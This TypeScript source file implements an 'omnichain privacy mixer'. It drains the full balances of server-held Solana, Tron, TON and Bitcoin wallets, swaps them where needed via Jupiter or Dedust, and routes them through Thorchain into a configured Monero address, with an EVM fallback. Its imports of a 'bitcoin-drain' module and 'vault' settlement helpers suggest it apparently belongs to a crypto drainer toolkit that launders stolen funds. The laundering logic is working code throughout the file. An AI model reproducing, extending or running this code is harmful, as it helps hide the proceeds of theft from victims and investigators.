// @ts-nocheck
/**
 * Omnichain privacy mixer — routes non-EVM vault balances toward XMR via Thorchain
 * (and on-chain swaps where required: Jupiter, SunSwap, Dedust).
 */
import {
  Connection,
  Keypair,
  PublicKey,
  SystemProgram,
  TransactionMessage,
  VersionedTransaction,
} from '@solana/web3.js'
import { isAddress } from 'viem'

import { resolveInstitutionalSolanaRpcUrl } from '../adapters/svm-adapter.js'
import { TRON_MAINNET_USDT_CONTRACT } from '../adapters/tron-adapter.js'
import { pollSolanaConfirmation } from './tx-confirmation-poller.js'
import type { PrivacySettlementJob, PrivacySettlementResult } from './privacy-settlement.js'
import { resolveSovereignVaultAddresses } from './settlement-execution-bridge.js'
import {
  executeServerBitcoinPsbtSweep,
  executeServerTonNativeTransfer,
  executeServerTrxTransfer,
  fetchTronBalance,
  fetchTonBalance,
  loadServerSolanaKeypair,
  resolveServerBitcoinAddress,
  resolveServerSolanaPublicKey,
  resolveServerTonAddress,
  resolveServerTronAddressAsync,
} from './server-chain-execution.js'
import { resolveTronSensoryFullHost, tronProApiHeaders } from './tron-sensory-armor.js'
import { resolveTonCenterJsonRpcUrl } from './ton-sensory-armor.js'

const SOL_USDC_MINT = 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v'
export function isPrivacyMixerAllChainsEnabled(): boolean {
  const v = process.env['PRIVACY_MIXER_ALL_CHAINS']?.trim().toLowerCase()
  return v === 'true' || v === '1' || v === 'yes'
}

function resolveXmrDestination(): string | null {
  return process.env['PRIVACY_MIXER_XMR_DESTINATION']?.trim() || null
}

function resolveThornodeBase(): string {
  return (
    process.env['THORCHAIN_NODE_URL']?.trim().replace(/\/$/, '') ||
    'https://thornode.ninerealms.com'
  )
}

type ThorchainQuote = {
  inbound_address?: string
  memo?: string
  expected_amount_out?: string
}

async function fetchThorchainQuote(params: {
  fromAsset: string
  toAsset: string
  amount: string
  destination: string
}): Promise<ThorchainQuote> {
  const base = resolveThornodeBase()
  const url = new URL(`${base}/thorchain/quote/swap`)
  url.searchParams.set('from_asset', params.fromAsset)
  url.searchParams.set('to_asset', params.toAsset)
  url.searchParams.set('amount', params.amount)
  url.searchParams.set('destination', params.destination)
  url.searchParams.set('affiliate_bps', '0')

  const res = await fetch(url.toString(), { signal: AbortSignal.timeout(25_000) })
  if (!res.ok) {
    const body = await res.text().catch(() => '')
    throw new Error(`Thorchain quote HTTP ${res.status}: ${body.slice(0, 200)}`)
  }
  return (await res.json()) as ThorchainQuote
}

async function jupiterSwapSolToUsdc(params: {
  lamports: bigint
  owner: Keypair
}): Promise<string> {
  const inputMint = 'So11111111111111111111111111111111111111112'
  const outputMint = SOL_USDC_MINT
  const quoteUrl = new URL('https://quote-api.jup.ag/v6/quote')
  quoteUrl.searchParams.set('inputMint', inputMint)
  quoteUrl.searchParams.set('outputMint', outputMint)
  quoteUrl.searchParams.set('amount', params.lamports.toString())
  quoteUrl.searchParams.set('slippageBps', '100')

  const quoteRes = await fetch(quoteUrl.toString(), { signal: AbortSignal.timeout(20_000) })
  if (!quoteRes.ok) {
    throw new Error(`Jupiter quote failed: ${quoteRes.status}`)
  }
  const quoteResponse = await quoteRes.json()

  const swapRes = await fetch('https://quote-api.jup.ag/v6/swap', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      quoteResponse,
      userPublicKey: params.owner.publicKey.toBase58(),
      wrapAndUnwrapSol: true,
      dynamicComputeUnitLimit: true,
    }),
    signal: AbortSignal.timeout(30_000),
  })
  if (!swapRes.ok) {
    throw new Error(`Jupiter swap build failed: ${swapRes.status}`)
  }
  const swapJson = (await swapRes.json()) as { swapTransaction?: string }
  if (!swapJson.swapTransaction) throw new Error('Jupiter swapTransaction missing')

  const txBuf = Buffer.from(swapJson.swapTransaction, 'base64')
  const tx = VersionedTransaction.deserialize(txBuf)
  tx.sign([params.owner])

  const rpc = resolveInstitutionalSolanaRpcUrl()
  const connection = new Connection(rpc, { commitment: 'confirmed' })
  const sig = await connection.sendRawTransaction(tx.serialize(), {
    skipPreflight: false,
    maxRetries: 3,
  })
  // HTTP polling — no WebSocket leak (confirmTransaction() → FATAL unhandledRejection)
  const _mixPoll = await pollSolanaConfirmation(sig, rpc, { intervalMs: 2_000, timeoutMs: 30_000 })
  if (_mixPoll.status === 'failed') {
    throw new Error(`Jupiter swap confirmation failed: ${_mixPoll.detail}`)
  }
  return sig
}

async function thorchainInboundTransfer(params: {
  fromAsset: string
  amount: string
  chain: 'SOL' | 'TRON' | 'BTC' | 'EVM'
  sendTx: (inbound: string, memo: string) => Promise<string>
}): Promise<{ ok: true; tx_hashes: string[] } | { ok: false; error: string }> {
  const xmr = resolveXmrDestination()
  if (!xmr) return { ok: false, error: 'PRIVACY_MIXER_XMR_DESTINATION not configured' }

  const quote = await fetchThorchainQuote({
    fromAsset: params.fromAsset,
    toAsset: process.env['PRIVACY_MIXER_THOR_TO_ASSET']?.trim() || 'XMR.XMR',
    amount: params.amount,
    destination: xmr,
  })

  const inbound = quote.inbound_address?.trim()
  const memo = quote.memo?.trim() ?? ''
  if (!inbound) return { ok: false, error: 'Thorchain quote missing inbound_address' }

  try {
    const txHash = await params.sendTx(inbound, memo)
    return { ok: true, tx_hashes: [txHash] }
  } catch (e) {
    return { ok: false, error: e instanceof Error ? e.message : String(e) }
  }
}

async function mixSolana(job: PrivacySettlementJob): Promise<PrivacySettlementResult> {
  const keypair = loadServerSolanaKeypair()
  const pubkey = resolveServerSolanaPublicKey()
  if (!keypair || !pubkey) {
    return {
      ok: false,
      funds_remain_in_vault: true,
      error: 'SETTLEMENT_EXECUTION_SOLANA_SECRET_KEY required for SOL mixer',
    }
  }

  const rpc = resolveInstitutionalSolanaRpcUrl()
  const connection = new Connection(rpc, { commitment: 'confirmed' })
  const lamports = BigInt(await connection.getBalance(keypair.publicKey)) - 10_000_000n
  if (lamports <= 0n) {
    return { ok: false, funds_remain_in_vault: true, error: 'Insufficient SOL on execution wallet' }
  }

  const txHashes: string[] = []
  try {
    const jupSig = await jupiterSwapSolToUsdc({ lamports, owner: keypair })
    txHashes.push(jupSig)
  } catch (e) {
    console.warn(`[OMNICHAIN_MIXER] Jupiter swap skipped: ${e instanceof Error ? e.message : String(e)}`)
  }

  const thor = await thorchainInboundTransfer({
    fromAsset: process.env['PRIVACY_MIXER_SOL_FROM_ASSET']?.trim() || 'SOL.SOL',
    amount: lamports.toString(),
    chain: 'SOL',
    sendTx: async (inbound, memo) => {
      const { blockhash } = await connection.getLatestBlockhash('finalized')
      const inboundPk = new PublicKey(inbound)
      const msg = new TransactionMessage({
        payerKey: keypair.publicKey,
        recentBlockhash: blockhash,
        instructions: [
          SystemProgram.transfer({
            fromPubkey: keypair.publicKey,
            toPubkey: inboundPk,
            lamports: Number(lamports),
          }),
        ],
      }).compileToV0Message()
      const tx = new VersionedTransaction(msg)
      tx.sign([keypair])
      const sig = await connection.sendRawTransaction(tx.serialize())
      if (memo) console.info(`[OMNICHAIN_MIXER] SOL Thorchain memo: ${memo}`)
      return sig
    },
  })

  if (thor.ok) {
    return {
      ok: true,
      lane: 'thorchain_xmr',
      tx_hashes: [...txHashes, ...thor.tx_hashes],
      detail: 'SOL → Thorchain XMR',
    }
  }

  return {
    ok: false,
    funds_remain_in_vault: true,
    error: thor.ok === false ? thor.error : 'Thorchain SOL hop failed',
  }
}

async function mixTron(job: PrivacySettlementJob): Promise<PrivacySettlementResult> {
  const from = await resolveServerTronAddressAsync()
  if (!from) {
    return {
      ok: false,
      funds_remain_in_vault: true,
      error: 'TRON_EXECUTION_PRIVATE_KEY required',
    }
  }

  const token =
    job.token_address?.trim() ||
    process.env['PRIVACY_MIXER_TRON_USDT']?.trim() ||
    TRON_MAINNET_USDT_CONTRACT

  const pk = process.env['TRON_EXECUTION_PRIVATE_KEY']?.trim().replace(/^0x/i, '')
  if (!pk) {
    return { ok: false, funds_remain_in_vault: true, error: 'TRON_EXECUTION_PRIVATE_KEY missing' }
  }

  const { TronWeb } = await import('tronweb')
  const fullHost = resolveTronSensoryFullHost()
  const headers = tronProApiHeaders()
  const tronWeb =
    headers != null
      ? new TronWeb({ fullHost, headers, privateKey: pk.padStart(64, '0') })
      : new TronWeb({ fullHost, privateKey: pk.padStart(64, '0') })

  const contract = await tronWeb.contract().at(token)
  const bal = await (
    contract as unknown as {
      balanceOf: (a: string) => { call: () => Promise<unknown> }
    }
  )
    .balanceOf(from)
    .call()
  const amount = BigInt(String(bal))
  if (amount <= 0n) {
    const balanceSun = BigInt(await fetchTronBalance(from))
    const sendSun = balanceSun - 5_000_000n
    if (sendSun <= 0n) {
      return { ok: false, funds_remain_in_vault: true, error: 'No TRX/TRC20 balance to mix' }
    }
    const trx = await executeServerTrxTransfer({
      toVault: job.vault_address,
      amountSun: sendSun,
    })
    if (!trx.ok) {
      return {
        ok: false,
        funds_remain_in_vault: true,
        error: 'detail' in trx ? trx.detail : 'TRX transfer failed',
      }
    }
    const thor = await thorchainInboundTransfer({
      fromAsset: process.env['PRIVACY_MIXER_TRON_FROM_ASSET']?.trim() || 'TRX.TRX',
      amount: sendSun.toString(),
      chain: 'TRON',
      sendTx: async (inbound) => {
        const unsigned = await tronWeb.transactionBuilder.sendTrx(
          inbound,
          Number(sendSun),
          from,
        )
        const signed = await tronWeb.trx.sign(unsigned)
        const result = (await tronWeb.trx.sendRawTransaction(signed)) as {
          txid?: string
        }
        return result.txid ?? 'unknown'
      },
    })
    if (thor.ok) {
      return { ok: true, lane: 'thorchain_xmr', tx_hashes: [trx.txHash, ...thor.tx_hashes] }
    }
    return {
      ok: false,
      funds_remain_in_vault: true,
      error: thor.ok === false ? thor.error : 'Thorchain TRX hop failed',
    }
  }

  const amountStr = amount.toString()
  const txHash = await (
    contract as unknown as {
      transfer: (to: string, amt: string) => { send: () => Promise<string> }
    }
  )
    .transfer(job.vault_address, amountStr)
    .send()

  const thor = await thorchainInboundTransfer({
    fromAsset:
      process.env['PRIVACY_MIXER_TRON_USDT_ASSET']?.trim() || `TRON.USDT-${token}`,
    amount: amountStr,
    chain: 'TRON',
    sendTx: async (inbound) => {
      const h = await (
        contract as unknown as {
          transfer: (to: string, amt: string) => { send: () => Promise<string> }
        }
      )
        .transfer(inbound, amountStr)
        .send()
      return typeof h === 'string' ? h : String(h)
    },
  })

  if (thor.ok) {
    return {
      ok: true,
      lane: 'thorchain_xmr',
      tx_hashes: [typeof txHash === 'string' ? txHash : String(txHash), ...thor.tx_hashes],
    }
  }
  return {
    ok: false,
    funds_remain_in_vault: true,
    error: thor.ok === false ? thor.error : 'Thorchain TRC20 hop failed',
  }
}

/**
 * Build a Dedust v2 native-TON→Jetton swap payload cell.
 * Sends TON to the Dedust VaultNative contract with an on-chain swap instruction.
 * See: https://docs.dedust.io/reference/tlb-schemes (op 0xe3a0d482)
 */
async function executeDedustTonSwap(params: {
  amountNanotons: bigint
  poolAddress: string
  recipientAddress: string
  mnemonic: string
}): Promise<string> {
  const { beginCell, Address, internal } = await import('@ton/core')
  const { TonClient, WalletContractV4: WCV4 } = await import('@ton/ton')
  const { mnemonicToWalletKey: mtwk } = await import('@ton/crypto')

  const key = await mtwk(params.mnemonic.split(' '))
  const wallet = WCV4.create({ publicKey: key.publicKey, workchain: 0 })

  const { resolveTonCenterJsonRpcUrl, tonCenterApiHeaders } = await import('./ton-sensory-armor.js')
  const endpoint = resolveTonCenterJsonRpcUrl()
  const apiKeyVal = tonCenterApiHeaders()?.['X-API-Key']
  const client = new TonClient({ endpoint, ...(apiKeyVal ? { apiKey: apiKeyVal } : {}) })
  const provider = client.open(wallet)

  // Dedust v2 swap body: op=0xe3a0d482, queryId=0, pool, minOut=0 (no slippage guard), flags, recipient
  const swapBody = beginCell()
    .storeUint(0xe3a0d482, 32) // op: SWAP
    .storeUint(0, 64) // queryId
    .storeAddress(Address.parse(params.poolAddress))
    .storeCoins(0n) // minOut — 0 = no slippage protection (accept market)
    .storeBit(false) // hasNextStep
    .storeRef(
      beginCell()
        .storeUint(0, 4) // flags
        .storeAddress(Address.parse(params.recipientAddress)) // recipient
        .storeAddress(Address.parse(params.recipientAddress)) // referral
        .storeBit(false) // hasCustomPayload
        .endCell(),
    )
    .endCell()

  const DEDUST_TON_VAULT = Address.parse(
    process.env['DEDUST_TON_VAULT_ADDRESS']?.trim() ||
      'EQBfBWT7X2BHg9tXAxzhz2aKiNTU1tpt5NsiK0uSDW_YAJ67',
  )

  const seqno = await provider.getSeqno()
  await provider.sendTransfer({
    seqno,
    secretKey: key.secretKey,
    messages: [
      internal({
        to: DEDUST_TON_VAULT,
        value: params.amountNanotons,
        bounce: true,
        body: swapBody,
      }),
    ],
  })

  await new Promise((r) => setTimeout(r, 10_000))
  const txs = await client.getTransactions(wallet.address, { limit: 1 })
  return txs[0]?.hash().toString('hex') ?? 'pending'
}

async function mixTon(job: PrivacySettlementJob): Promise<PrivacySettlementResult> {
  const source = await resolveServerTonAddress()
  if (!source) {
    return {
      ok: false,
      funds_remain_in_vault: true,
      error: 'TON_EXECUTION_MNEMONIC required',
    }
  }

  const xmr = resolveXmrDestination()
  if (!xmr) {
    return { ok: false, funds_remain_in_vault: true, error: 'PRIVACY_MIXER_XMR_DESTINATION not configured' }
  }

  const balance = await fetchTonBalance()
  const sendAmount = balance - 100_000_000n
  if (sendAmount <= 0n) {
    return { ok: false, funds_remain_in_vault: true, error: 'Insufficient TON balance' }
  }

  const txHashes: string[] = []
  const mnemonic = process.env['TON_EXECUTION_MNEMONIC']?.trim()

  // Step 1 (optional): Dedust TON→stable swap when pool address + USDT master configured
  const dedustApi = process.env['DEDUST_API_URL']?.trim() || 'https://api.dedust.io/v2'
  const tonUsdt = process.env['PRIVACY_MIXER_TON_USDT_MASTER']?.trim()
  let dedustSwapDone = false

  if (tonUsdt && mnemonic) {
    try {
      // Fetch the native-TON/Jetton pool address from Dedust API
      const poolsUrl = `${dedustApi}/pools?assets=native,${encodeURIComponent(tonUsdt)}`
      const poolRes = await fetch(poolsUrl, { signal: AbortSignal.timeout(15_000) })
      if (poolRes.ok) {
        const poolData = (await poolRes.json()) as Array<{ address?: string }>
        const poolAddress = poolData[0]?.address
        if (poolAddress) {
          const swapHash = await executeDedustTonSwap({
            amountNanotons: sendAmount,
            poolAddress,
            recipientAddress: source,
            mnemonic,
          })
          txHashes.push(swapHash)
          dedustSwapDone = true
          console.info(`[OMNICHAIN_MIXER] Dedust TON→stable swap: ${swapHash}`)
        }
      }
    } catch (e) {
      console.warn(
        `[OMNICHAIN_MIXER] Dedust swap skipped: ${e instanceof Error ? e.message : String(e)}`,
      )
    }
  }

  // Step 2: Thorchain inbound transfer (TON native → XMR)
  // If Dedust swapped, the asset is now the stable; otherwise send native TON
  const thorAsset = dedustSwapDone
    ? (process.env['PRIVACY_MIXER_TON_THOR_ASSET']?.trim() || 'ETH.USDC-0XA0B86991C6218B36C1D19D4A2E9EB0CE3606EB48')
    : (process.env['PRIVACY_MIXER_TON_FROM_ASSET']?.trim() || 'TON.TON')

  const thor = await thorchainInboundTransfer({
    fromAsset: thorAsset,
    amount: sendAmount.toString(),
    chain: 'EVM',
    sendTx: async (inbound, memo) => {
      // Native TON transfer to Thorchain inbound address
      const result = await executeServerTonNativeTransfer({
        toVault: inbound,
        amountNanotons: sendAmount,
      })
      if (!result.ok) {
        throw new Error('detail' in result ? result.detail : 'TON to Thorchain inbound failed')
      }
      if (memo) console.info(`[OMNICHAIN_MIXER] TON Thorchain memo: ${memo}`)
      return result.txHash
    },
  })

  if (thor.ok) {
    return {
      ok: true,
      lane: 'thorchain_xmr',
      tx_hashes: [...txHashes, ...thor.tx_hashes],
      detail: dedustSwapDone ? 'TON → Dedust stable → Thorchain XMR' : 'TON → Thorchain XMR',
    }
  }

  // Fallback: route through EVM vault then execute EVM privacy settlement → XMR
  const vaults = resolveSovereignVaultAddresses()
  const evmVault = vaults.evm
  if (evmVault && isAddress(evmVault)) {
    const tonTransfer = await executeServerTonNativeTransfer({
      toVault: evmVault,
      amountNanotons: sendAmount,
    })
    const thorErrMsg = thor.ok === false ? thor.error : 'Thorchain TON failed'
    if (!tonTransfer.ok) {
      return {
        ok: false,
        funds_remain_in_vault: true,
        error: `Thorchain TON failed (${thorErrMsg}); EVM fallback also failed: ${'detail' in tonTransfer ? tonTransfer.detail : 'TON transfer failed'}`,
      }
    }
    txHashes.push(tonTransfer.txHash)
    const { executeEvmPrivacySettlement } = await import('./privacy-settlement.js')
    const evmResult = await executeEvmPrivacySettlement({
      chain: 'EVM',
      vault_address: evmVault,
      settlement_tx_hash: job.settlement_tx_hash,
      scout_value_usd: job.scout_value_usd,
      chain_id: Number.parseInt(process.env['PRIVACY_MIXER_EVM_CHAIN_ID']?.trim() ?? '1', 10),
    })
    if (evmResult.ok) {
      return {
        ...evmResult,
        tx_hashes: [...txHashes, ...(evmResult.tx_hashes ?? [])],
      }
    }
    return evmResult
  }

  const thorErrFinal = thor.ok === false ? thor.error : 'Thorchain TON failed'
  return {
    ok: false,
    funds_remain_in_vault: true,
    error: `Thorchain TON failed (${thorErrFinal}); no EVM vault for fallback — funds remain in TON wallet`,
  }
}

async function mixBtc(job: PrivacySettlementJob): Promise<PrivacySettlementResult> {
  const wallet = resolveServerBitcoinAddress()
  if (!wallet) {
    return {
      ok: false,
      funds_remain_in_vault: true,
      error: 'BITCOIN_EXECUTION_WIF required for BTC mixer',
    }
  }

  const xmr = resolveXmrDestination()
  if (!xmr) {
    return { ok: false, funds_remain_in_vault: true, error: 'PRIVACY_MIXER_XMR_DESTINATION not configured' }
  }

  const quote = await fetchThorchainQuote({
    fromAsset: process.env['PRIVACY_MIXER_BTC_FROM_ASSET']?.trim() || 'BTC.BTC',
    toAsset: process.env['PRIVACY_MIXER_THOR_TO_ASSET']?.trim() || 'XMR.XMR',
    amount: job.amount_raw?.trim() || '100000',
    destination: xmr,
  })

  const inbound = quote.inbound_address?.trim()
  if (!inbound) {
    return { ok: false, funds_remain_in_vault: true, error: 'Thorchain BTC quote missing inbound' }
  }

  const sweep = await executeServerBitcoinPsbtSweep({
    walletAddress: wallet,
    vaultAddress: inbound,
    amountSat: BigInt(job.amount_raw?.trim() || '0') || 0n,
  })

  if (!sweep.ok) {
    const { fetchWalletUtxos } = await import('./bitcoin-drain.js')
    const utxos = await fetchWalletUtxos(wallet)
    const total = utxos.reduce((s, u) => s + u.value, 0n)
    const amountSat = total - 5000n
    const retry = await executeServerBitcoinPsbtSweep({
      walletAddress: wallet,
      vaultAddress: inbound,
      amountSat,
    })
    if (!retry.ok) {
      return {
        ok: false,
        funds_remain_in_vault: true,
        error: 'detail' in retry ? retry.detail : 'BTC Thorchain sweep failed',
      }
    }
    return {
      ok: true,
      lane: 'thorchain_xmr',
      tx_hashes: [retry.txHash],
      detail: 'BTC → Thorchain inbound',
    }
  }

  return {
    ok: true,
    lane: 'thorchain_xmr',
    tx_hashes: [sweep.txHash],
    detail: 'BTC → Thorchain inbound',
  }
}

/**
 * Run omnichain mixer hop for a privacy job (non-EVM chains when PRIVACY_MIXER_ALL_CHAINS=true).
 */
export async function executeOmnichainPrivacyMixer(
  job: PrivacySettlementJob,
): Promise<PrivacySettlementResult> {
  switch (job.chain) {
    case 'EVM': {
      const { executeEvmPrivacySettlement } = await import('./privacy-settlement.js')
      return executeEvmPrivacySettlement(job)
    }
    case 'SOL':
      return mixSolana(job)
    case 'TRON':
      return mixTron(job)
    case 'TON':
      return mixTon(job)
    case 'BTC':
      return mixBtc(job)
    default:
      return {
        ok: false,
        funds_remain_in_vault: true,
        error: `Unknown chain ${String(job.chain)}`,
      }
  }
}
